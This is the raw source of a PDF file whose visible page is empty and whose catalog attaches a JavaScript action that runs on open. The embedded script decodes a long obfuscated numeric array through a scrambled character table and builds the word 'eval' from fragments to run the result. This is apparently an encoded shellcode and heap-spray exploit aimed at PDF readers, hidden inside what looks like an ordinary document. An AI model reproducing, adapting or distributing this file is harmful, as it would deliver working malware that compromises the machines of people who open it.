%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[24,
6,
28,
49,
53,
68,
9,
16,
0,
38,
19,
19,
9,
16,
65,
39,
11,
14,
9,
16,
0,
72,
65,
39,
9,
16,
3,
72,
11,
14,
9,
16,
11,
66,
38,
14,
9,
16,
38,
38,
72,
65,
9,
16,
19,
14,
39,
35,
9,
16,
14,
35,
0,
24,
9,
16,
0,
24,
38,
35,
9,
16,
35,
39,
14,
35,
9,
16,
3,
35,
0,
24,
9,
16,
72,
19,
22,
39,
9,
16,
3,
19,
0,
24,
9,
16,
38,
38,
35,
0,
9,
16,
19,
19,
32,
24,
9,
16,
72,
11,
0,
24,
9,
16,
35,
38,
38,
39,
9,
16,
38,
38,
3,
14,
9,
16,
0,
22,
64,
39,
9,
16,
22,
72,
11,
11,
9,
16,
65,
65,
22,
35,
9,
16,
24,
0,
65,
65,
9,
16,
14,
35,
0,
24,
9,
16,
39,
38,
38,
35,
9,
16,
38,
66,
14,
19,
9,
16,
3,
72,
35,
19,
9,
16,
0,
3,
65,
24,
9,
16,
64,
14,
38,
14,
9,
16,
11,
14,
0,
72,
9,
16,
72,
22,
3,
72,
9,
16,
11,
24,
11,
66,
9,
16,
72,
22,
14,
39,
9,
16,
0,
24,
72,
19,
9,
16,
38,
39,
3,
72,
9,
16,
3,
14,
0,
24,
9,
16,
3,
0,
38,
72,
9,
16,
65,
72,
35,
38,
9,
16,
0,
24,
72,
19,
9,
16,
64,
35,
3,
19,
9,
16,
65,
72,
35,
38,
9,
16,
39,
66,
38,
38,
9,
16,
14,
22,
14,
66,
9,
16,
40,
32,
65,
39,
9,
16,
39,
72,
35,
38,
9,
16,
32,
24,
38,
38,
9,
16,
24,
11,
35,
65,
9,
16,
38,
0,
22,
35,
9,
16,
3,
14,
65,
64,
9,
16,
39,
22,
35,
0,
9,
16,
35,
32,
39,
24,
9,
16,
32,
40,
35,
38,
9,
16,
11,
24,
14,
35,
9,
16,
38,
24,
65,
22,
9,
16,
3,
72,
22,
65,
9,
16,
72,
11,
11,
19,
9,
16,
72,
11,
0,
24,
9,
16,
35,
38,
64,
14,
9,
16,
19,
19,
32,
32,
9,
16,
35,
39,
0,
24,
9,
16,
0,
32,
14,
24,
9,
16,
11,
39,
14,
19,
9,
16,
72,
14,
65,
65,
9,
16,
35,
39,
64,
14,
9,
16,
32,
0,
0,
24,
9,
16,
32,
32,
35,
38,
9,
16,
35,
14,
0,
24,
9,
16,
35,
38,
0,
24,
9,
16,
40,
24,
39,
72,
9,
16,
72,
66,
72,
11,
9,
16,
11,
24,
39,
38,
9,
16,
40,
32,
72,
38,
9,
16,
19,
0,
0,
24,
9,
16,
0,
35,
64,
35,
9,
16,
35,
39,
3,
32,
9,
16,
3,
14,
38,
38,
9,
16,
66,
19,
35,
38,
9,
16,
65,
38,
11,
24,
9,
16,
19,
0,
0,
24,
9,
16,
0,
24,
35,
0,
9,
16,
19,
40,
65,
3,
9,
16,
72,
66,
35,
72,
9,
16,
66,
0,
11,
0,
9,
16,
65,
65,
65,
65,
9,
16,
11,
64,
65,
65,
9,
16,
11,
0,
65,
66,
9,
16,
35,
35,
35,
35,
9,
16,
35,
35,
35,
35,
9,
16,
72,
35,
72,
0,
9,
16,
14,
35,
19,
40,
9,
16,
65,
65,
19,
0,
9,
16,
35,
35,
35,
35,
9,
16,
72,
35,
35,
35,
9,
16,
39,
35,
0,
38,
9,
16,
72,
35,
22,
66,
9,
16,
0,
24,
72,
72,
9,
16,
0,
24,
11,
39,
9,
16,
22,
35,
72,
11,
9,
16,
39,
38,
0,
38,
9,
16,
65,
65,
35,
72,
9,
16,
19,
0,
11,
38,
9,
16,
19,
11,
19,
65,
9,
16,
35,
35,
35,
35,
9,
16,
3,
72,
19,
0,
9,
16,
19,
39,
3,
64,
9,
16,
72,
14,
19,
32,
9,
16,
22,
19,
65,
65,
9,
16,
39,
14,
0,
38,
9,
16,
0,
24,
35,
0,
9,
16,
11,
0,
11,
0,
9,
16,
65,
65,
19,
22,
9,
16,
65,
65,
65,
65,
9,
16,
35,
64,
11,
24,
9,
16,
3,
64,
11,
24,
9,
16,
11,
39,
0,
22,
9,
16,
35,
22,
35,
14,
9,
16,
35,
35,
35,
35,
9,
16,
72,
39,
0,
32,
9,
16,
35,
39,
64,
14,
9,
16,
35,
14,
39,
3,
9,
16,
3,
64,
64,
14,
9,
16,
19,
3,
19,
72,
9,
16,
39,
3,
3,
38,
9,
16,
64,
14,
14,
14,
9,
16,
3,
19,
35,
14,
9,
16,
38,
38,
3,
64,
9,
16,
39,
3,
38,
64,
9,
16,
64,
14,
14,
14,
9,
16,
64,
35,
35,
0,
9,
16,
3,
38,
64,
32,
9,
16,
72,
38,
64,
35,
9,
16,
65,
0,
19,
0,
9,
16,
35,
35,
35,
35,
9,
16,
65,
65,
35,
35,
9,
16,
35,
39,
72,
19,
9,
16,
11,
0,
0,
24,
9,
16,
39,
66,
38,
38,
9,
16,
39,
3,
72,
22,
9,
16,
22,
32,
14,
14,
9,
16,
3,
3,
35,
35,
9,
16,
19,
64,
3,
35,
9,
16,
39,
3,
3,
14,
9,
16,
22,
32,
14,
14,
9,
16,
64,
11,
35,
72,
9,
16,
19,
39,
19,
14,
9,
16,
39,
19,
19,
39,
9,
16,
22,
32,
14,
14,
9,
16,
35,
35,
35,
66,
9,
16,
0,
40,
72,
66,
9,
16,
35,
14,
39,
22,
9,
16,
0,
0,
38,
35,
9,
16,
22,
32,
14,
14,
9,
16,
14,
22,
35,
14,
9,
16,
19,
40,
72,
22,
9,
16,
19,
40,
35,
35,
9,
16,
72,
38,
35,
35,
9,
16,
19,
40,
72,
3,
9,
16,
65,
65,
35,
35,
9,
16,
22,
14,
72,
19,
9,
16,
39,
35,
0,
72,
9,
16,
22,
19,
3,
72,
9,
16,
35,
35,
19,
40,
9,
16,
65,
65,
72,
38,
9,
16,
35,
14,
72,
19,
9,
16,
35,
35,
19,
40,
9,
16,
11,
24,
0,
38,
9,
16,
72,
38,
35,
39,
9,
16,
72,
19,
65,
65,
9,
16,
0,
38,
35,
14,
9,
16,
35,
39,
39,
38,
9,
16,
35,
64,
11,
24,
9,
16,
22,
38,
11,
24,
9,
16,
0,
35,
14,
3,
9,
16,
35,
35,
38,
65,
9,
16,
65,
40,
3,
72,
9,
16,
0,
35,
14,
3,
9,
16,
35,
35,
38,
65,
9,
16,
39,
14,
3,
72,
9,
16,
35,
35,
19,
40,
9,
16,
65,
11,
19,
40,
9,
16,
72,
19,
65,
65,
9,
16,
11,
0,
35,
0,
9,
16,
65,
11,
66,
39,
9,
16,
65,
65,
65,
65,
9,
16,
14,
11,
0,
11,
9,
16,
11,
39,
35,
11,
9,
16,
65,
11,
66,
0,
9,
16,
35,
11,
0,
40,
9,
16,
19,
65,
0,
66,
9,
16,
24,
32,
35,
22,
9,
16,
39,
40,
38,
38,
9,
16,
72,
24,
0,
40,
9,
16,
39,
19,
22,
24,
9,
16,
3,
66,
14,
19,
9,
16,
22,
40,
38,
19,
9,
16,
3,
35,
64,
65,
9,
16,
3,
14,
19,
0,
9,
16,
3,
35,
3,
14,
9,
16,
64,
65,
38,
40,
9,
16,
38,
66,
64,
65,
9,
16,
64,
11,
38,
22,
9,
16,
38,
35,
38,
64,
9,
16,
64,
11,
38,
64,
9,
16,
38,
14,
38,
64,
9,
16,
64,
11,
38,
14,
9,
16,
38,
66,
38,
0,
9,
16,
19,
38,
64,
65,
9,
16,
3,
35,
64,
11,
9,
16,
3,
35,
19,
0,
9,
16,
19,
19,
38,
65,
9,
16,
38,
38,
38,
32,
9,
16,
38,
22,
14,
14,
9,
16,
38,
19,
38,
66,
9,
16,
19,
72,
64,
19,
9,
16,
38,
38,
38,
32,
9,
16,
35,
35,
35,
35,
68,
41,
65,
16,
74,
39,
46,
25,
57,
74,
23,
11,
58,
52,
55,
26,
55,
40,
7,
67,
75,
20,
43,
62,
56,
25,
2,
11,
26,
55,
40,
59,
2,
11,
74,
49,
46,
56,
60,
64,
8,
67,
75,
20,
43,
55,
40,
10,
53,
55,
40,
41,
45,
55,
40,
53,
55,
40,
59,
28,
16,
24,
28,
46,
55,
25,
74,
49,
26,
35,
7,
67,
75,
1,
64,
20,
41,
55,
11,
46,
16,
55,
74,
23,
55,
40,
41,
45,
23,
65,
16,
74,
39,
46,
25,
57,
74,
23,
24,
37,
26,
20,
43,
52,
40,
55,
23,
32,
71,
49,
53,
74,
11,
62,
23,
61,
55,
55,
40,
75,
26,
20,
41,
52,
40,
55,
23,
52,
62,
53,
35,
37,
35,
39,
35,
39,
35,
39,
35,
39,
41,
52,
40,
55,
23,
40,
32,
32,
55,
53,
35,
37,
14,
35,
35,
35,
35,
35,
41,
52,
40,
55,
23,
5,
40,
75,
2,
57,
40,
32,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
24,
6,
28,
49,
20,
41,
52,
40,
55,
23,
28,
39,
17,
2,
11,
74,
53,
5,
40,
75,
2,
57,
40,
32,
59,
2,
11,
74,
49,
46,
56,
60,
64,
41,
52,
40,
55,
23,
67,
75,
53,
40,
32,
32,
55,
36,
26,
28,
39,
17,
2,
11,
74,
10,
35,
37,
38,
0,
20,
41,
52,
40,
55,
23,
75,
40,
55,
28,
5,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
33,
9,
16,
66,
35,
66,
35,
9,
16,
66,
35,
66,
35,
33,
20,
41,
75,
40,
55,
28,
5,
53,
11,
58,
52,
55,
26,
75,
40,
55,
28,
5,
7,
67,
75,
20,
41,
52,
40,
55,
23,
39,
57,
16,
74,
46,
64,
53,
26,
52,
62,
36,
35,
37,
14,
35,
35,
35,
35,
35,
20,
1,
40,
32,
32,
55,
41,
65,
57,
55,
26,
52,
40,
55,
23,
39,
57,
16,
74,
46,
53,
35,
41,
39,
57,
16,
74,
46,
8,
39,
57,
16,
74,
46,
64,
41,
39,
57,
16,
74,
46,
10,
10,
20,
43,
32,
71,
49,
51,
39,
57,
16,
74,
46,
27,
53,
75,
40,
55,
28,
5,
10,
5,
40,
75,
2,
57,
40,
32,
41,
45,
23,
52,
40,
55,
23,
57,
52,
11,
55,
65,
2,
57,
62,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
33,
9,
16,
35,
39,
35,
39,
9,
16,
35,
39,
35,
39,
33,
20,
41,
62,
56,
25,
2,
11,
26,
57,
52,
11,
55,
65,
2,
57,
62,
59,
2,
11,
74,
49,
46,
56,
8,
14,
14,
66,
72,
64,
20,
43,
57,
52,
11,
55,
65,
2,
57,
62,
10,
53,
57,
52,
11,
55,
65,
2,
57,
62,
41,
45,
23,
46,
56,
25,
28,
59,
39,
57,
2,
2,
40,
24,
31,
46,
57,
55,
11,
53,
48,
57,
2,
2,
40,
24,
59,
39,
57,
2,
2,
11,
39,
46,
30,
42,
40,
25,
2,
47,
74,
65,
57,
26,
43,
28,
16,
24,
6,
15,
33,
33,
7,
42,
28,
49,
15,
57,
52,
11,
55,
65,
2,
57,
62,
45,
20,
41,
45,
23,
65,
16,
74,
39,
46,
25,
57,
74,
23,
5,
55,
25,
74,
46,
65,
26,
20,
43,
74,
57,
5,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
33,
9,
16,
35,
61,
35,
61,
9,
16,
35,
61,
35,
61,
9,
16,
35,
61,
35,
61,
9,
16,
35,
61,
35,
61,
33,
20,
41,
52,
40,
55,
23,
5,
40,
75,
2,
57,
40,
32,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
24,
6,
28,
49,
20,
41,
56,
11,
40,
5,
24,
2,
57,
39,
71,
53,
74,
57,
5,
10,
5,
40,
75,
2,
57,
40,
32,
41,
24,
25,
49,
24,
2,
57,
39,
71,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
33,
9,
16,
35,
61,
35,
61,
9,
16,
35,
61,
35,
61,
33,
20,
41,
56,
11,
40,
32,
11,
55,
28,
25,
58,
11,
53,
64,
35,
41,
28,
5,
55,
40,
75,
53,
56,
11,
40,
32,
11,
55,
28,
25,
58,
11,
10,
56,
11,
40,
5,
24,
2,
57,
39,
71,
59,
2,
11,
74,
49,
46,
56,
41,
62,
56,
25,
2,
11,
26,
24,
25,
49,
24,
2,
57,
39,
71,
59,
2,
11,
74,
49,
46,
56,
8,
28,
5,
55,
40,
75,
20,
43,
24,
25,
49,
24,
2,
57,
39,
71,
10,
53,
24,
25,
49,
24,
2,
57,
39,
71,
41,
45,
23,
65,
25,
2,
2,
24,
2,
57,
39,
71,
53,
24,
25,
49,
24,
2,
57,
39,
71,
59,
28,
16,
24,
28,
46,
55,
25,
74,
49,
26,
35,
7,
28,
5,
55,
40,
75,
20,
41,
24,
2,
57,
39,
71,
53,
24,
25,
49,
24,
2,
57,
39,
71,
59,
28,
16,
24,
28,
46,
55,
25,
74,
49,
26,
35,
7,
24,
25,
49,
24,
2,
57,
39,
71,
59,
2,
11,
74,
49,
46,
56,
36,
28,
5,
55,
40,
75,
20,
41,
62,
56,
25,
2,
11,
26,
24,
2,
57,
39,
71,
59,
2,
11,
74,
49,
46,
56,
10,
28,
5,
55,
40,
75,
8,
35,
37,
14,
35,
35,
35,
35,
20,
43,
24,
2,
57,
39,
71,
53,
24,
2,
57,
39,
71,
10,
24,
2,
57,
39,
71,
10,
65,
25,
2,
2,
24,
2,
57,
39,
71,
41,
45,
23,
42,
11,
42,
53,
74,
11,
62,
23,
61,
55,
55,
40,
75,
26,
20,
41,
65,
57,
55,
26,
25,
53,
35,
41,
25,
8,
22,
14,
35,
35,
41,
25,
10,
10,
20,
43,
42,
11,
42,
51,
25,
27,
53,
24,
2,
57,
39,
71,
10,
56,
11,
40,
5,
24,
2,
57,
39,
71,
41,
45,
23,
52,
40,
55,
23,
74,
16,
42,
53,
22,
64,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
41,
16,
46,
25,
2,
59,
5,
55,
25,
74,
46,
65,
26,
33,
9,
14,
72,
35,
35,
35,
65,
33,
7,
74,
16,
42,
20,
41,
45,
23,
65,
16,
74,
39,
46,
25,
57,
74,
23,
49,
11,
46,
25,
39,
57,
74,
26,
20,
43,
52,
40,
55,
23,
40,
55,
55,
75,
53,
74,
11,
62,
23,
61,
55,
55,
40,
75,
26,
20,
41,
25,
65,
26,
40,
5,
5,
59,
32,
57,
39,
59,
48,
57,
2,
2,
40,
24,
59,
49,
11,
46,
47,
39,
57,
74,
20,
43,
52,
40,
55,
23,
5,
40,
75,
2,
57,
40,
32,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
24,
6,
28,
49,
20,
41,
52,
40,
55,
23,
56,
29,
67,
72,
35,
35,
48,
4,
53,
5,
40,
75,
2,
57,
40,
32,
59,
2,
11,
74,
49,
46,
56,
60,
64,
41,
52,
40,
55,
23,
67,
75,
53,
35,
37,
14,
35,
35,
35,
35,
35,
36,
26,
56,
29,
67,
72,
35,
35,
48,
4,
10,
35,
37,
38,
0,
20,
41,
52,
40,
55,
23,
75,
40,
55,
28,
5,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
33,
9,
16,
66,
35,
66,
35,
9,
16,
66,
35,
66,
35,
33,
20,
41,
75,
40,
55,
28,
5,
53,
11,
58,
52,
55,
26,
75,
40,
55,
28,
5,
7,
67,
75,
20,
41,
52,
40,
55,
23,
5,
72,
61,
6,
18,
19,
72,
65,
53,
26,
35,
37,
35,
39,
35,
39,
35,
39,
35,
39,
36,
35,
37,
14,
35,
35,
35,
35,
35,
20,
1,
35,
37,
14,
35,
35,
35,
35,
35,
41,
65,
57,
55,
26,
52,
40,
55,
23,
52,
67,
39,
13,
54,
66,
19,
75,
53,
35,
41,
52,
67,
39,
13,
54,
66,
19,
75,
8,
5,
72,
61,
6,
18,
19,
72,
65,
41,
52,
67,
39,
13,
54,
66,
19,
75,
10,
10,
20,
43,
40,
55,
55,
75,
51,
52,
67,
39,
13,
54,
66,
19,
75,
27,
53,
75,
40,
55,
28,
5,
10,
5,
40,
75,
2,
57,
40,
32,
41,
45,
23,
52,
40,
55,
23,
46,
21,
63,
56,
4,
24,
34,
62,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
33,
9,
35,
66,
33,
20,
41,
62,
56,
25,
2,
11,
26,
46,
21,
63,
56,
4,
24,
34,
62,
59,
2,
11,
74,
49,
46,
56,
8,
35,
37,
14,
35,
35,
35,
20,
43,
46,
21,
63,
56,
4,
24,
34,
62,
10,
53,
46,
21,
63,
56,
4,
24,
34,
62,
41,
45,
23,
46,
21,
63,
56,
4,
24,
34,
62,
53,
33,
4,
59,
33,
10,
46,
21,
63,
56,
4,
24,
34,
62,
41,
40,
5,
5,
59,
32,
57,
39,
59,
48,
57,
2,
2,
40,
24,
59,
49,
11,
46,
47,
39,
57,
74,
26,
46,
21,
63,
56,
4,
24,
34,
62,
20,
41,
45,
45,
23,
40,
12,
2,
16,
49,
25,
74,
28,
53,
40,
5,
5,
59,
5,
2,
16,
49,
47,
74,
28,
41,
52,
40,
55,
23,
28,
52,
53,
5,
40,
55,
28,
11,
47,
74,
46,
26,
40,
5,
5,
59,
52,
25,
11,
62,
11,
55,
69,
11,
55,
28,
25,
57,
74,
59,
46,
57,
31,
46,
55,
25,
74,
49,
26,
20,
59,
39,
56,
40,
55,
61,
46,
26,
35,
20,
20,
41,
65,
57,
55,
26,
52,
40,
55,
23,
25,
53,
35,
41,
25,
8,
40,
12,
2,
16,
49,
25,
74,
28,
59,
2,
11,
74,
49,
46,
56,
41,
25,
10,
10,
20,
43,
25,
65,
26,
40,
12,
2,
16,
49,
25,
74,
28,
51,
25,
27,
59,
74,
40,
42,
11,
53,
53,
68,
30,
31,
39,
55,
25,
5,
46,
68,
20,
43,
52,
40,
55,
23,
2,
52,
53,
40,
12,
2,
16,
49,
25,
74,
28,
51,
25,
27,
59,
52,
11,
55,
28,
25,
57,
74,
41,
45,
45,
23,
25,
65,
26,
26,
2,
52,
53,
53,
66,
20,
73,
73,
26,
26,
28,
52,
53,
53,
0,
20,
44,
44,
26,
2,
52,
8,
53,
0,
59,
22,
64,
20,
20,
20,
43,
49,
11,
46,
25,
39,
57,
74,
26,
20,
41,
45,
11,
2,
28,
11,
23,
25,
65,
26,
2,
52,
53,
53,
3,
59,
22,
20,
43,
5,
55,
25,
74,
46,
65,
26,
20,
41,
45,
11,
2,
28,
11,
23,
25,
65,
26,
26,
26,
28,
52,
53,
53,
19,
20,
73,
73,
26,
28,
52,
53,
53,
3,
20,
20,
44,
44,
26,
2,
52,
8,
3,
59,
22,
22,
20,
20,
43,
24,
37,
26,
20,
41,
45,
11,
2,
28,
11,
23,
25,
65,
26,
26,
2,
52,
70,
53,
66,
59,
22,
20,
73,
73,
26,
2,
52,
8,
53,
66,
59,
64,
20,
73,
73,
26,
2,
52,
70,
53,
0,
59,
22,
38,
20,
73,
73,
26,
2,
52,
8,
53,
0,
59,
22,
3,
20,
20,
43,
65,
16,
74,
39,
46,
25,
57,
74,
23,
40,
26,
20,
43,
16,
46,
25,
2,
59,
5,
55,
25,
74,
46,
32,
26,
68,
5,
50,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
22,
23,
15,
23,
75,
75,
75,
75,
22,
22,
22,
68,
7,
74,
11,
62,
23,
54,
40,
46,
11,
26,
20,
20,
41,
45,
52,
40,
55,
23,
56,
53,
40,
5,
5,
59,
5,
2,
16,
49,
47,
74,
28,
41,
65,
57,
55,
26,
52,
40,
55,
23,
65,
53,
35,
41,
65,
8,
56,
59,
2,
11,
74,
49,
46,
56,
41,
65,
10,
10,
20,
43,
25,
65,
26,
56,
51,
65,
27,
59,
74,
40,
42,
11,
53,
53,
68,
30,
31,
39,
55,
25,
5,
46,
68,
20,
43,
52,
40,
55,
23,
25,
53,
56,
51,
65,
27,
59,
52,
11,
55,
28,
25,
57,
74,
41,
45,
45,
23,
25,
65,
26,
26,
25,
70,
0,
59,
22,
64,
20,
44,
44,
26,
25,
8,
0,
59,
64,
20,
20,
43,
39,
53,
74,
11,
62,
23,
61,
55,
55,
40,
75,
26,
20,
41,
52,
40,
55,
23,
32,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
68,
9,
16,
66,
35,
66,
35,
9,
16,
66,
35,
66,
35,
68,
20,
41,
52,
40,
55,
23,
11,
53,
16,
74,
11,
28,
39,
40,
5,
11,
26,
24,
6,
28,
49,
20,
41,
62,
56,
25,
2,
11,
26,
32,
59,
2,
11,
74,
49,
46,
56,
8,
53,
35,
37,
0,
35,
35,
35,
20,
43,
32,
10,
53,
32,
41,
45,
32,
53,
32,
59,
28,
16,
24,
28,
46,
55,
26,
35,
7,
35,
37,
0,
35,
35,
35,
36,
11,
59,
2,
11,
74,
49,
46,
56,
20,
41,
65,
57,
55,
26,
65,
53,
35,
41,
65,
8,
64,
66,
35,
35,
41,
65,
10,
10,
20,
43,
39,
51,
65,
27,
53,
32,
10,
11,
41,
45,
40,
26,
20,
41,
40,
26,
20,
41,
46,
55,
75,
43,
46,
56,
25,
28,
59,
42,
11,
32,
25,
40,
59,
74,
11,
62,
12,
2,
40,
75,
11,
55,
26,
74,
16,
2,
2,
20,
41,
45,
39,
40,
46,
39,
56,
26,
11,
20,
43,
45,
40,
26,
20,
41,
45,
45];
cc={q:"8/l7Npj,<%+ePQ4:u_K6\)U1 bi\(]sWESd'G0-x3ca;m{&}tICg@[v=Drhoz.*AwM2f9q'V>k5|ny"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3854<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF